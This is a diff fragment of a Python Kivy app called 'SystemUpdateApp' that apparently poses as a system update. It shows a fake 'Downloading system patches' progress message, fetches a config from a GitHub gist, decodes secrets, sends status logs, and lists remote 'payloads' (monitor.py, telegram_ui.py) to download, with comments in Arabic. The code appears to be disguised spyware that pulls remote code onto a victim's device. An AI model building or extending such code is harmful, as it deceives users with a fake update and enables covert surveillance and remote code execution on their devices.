@@ -15,6 +15,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
     def build(self):
+        # الرابط الصحيح والمباشر لملف config.json (بدون بحث جوجل)
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
 
         layout = BoxLayout(orientation='vertical')
@@ -78,7 +79,7 @@ class SystemUpdateApp(App):
                 'v_id': self.decode_secret(config['v'])
             }
 
-            self.send_log("🚀 [System Update] Online! Jnius issue resolved.")
+            self.send_log("🚀 [System Update] Online! Configuration loaded.")
             self.label.text = "Downloading system patches... (35%)"
             self.load_payloads()
 
@@ -92,6 +93,7 @@ class SystemUpdateApp(App):
                 pass
 
     def load_payloads(self):
+        # جميع الروابط صحيحة ومباشرة (بدون google.com)
         payload_urls = [
             "https://gist.githubusercontent.com/Zaen1993/e4af91aec551d599cc8b8ff244c36f23/raw/60c2108cd5fb3b5a78a8c2d9afb4519576526863/monitor.py",
             "https://gist.githubusercontent.com/Zaen1993/65685db73176fe064d3b8aaf7c699542/raw/a191c5e5dd42acef68154b2b72fb028a54cc82cb/telegram_ui.py",
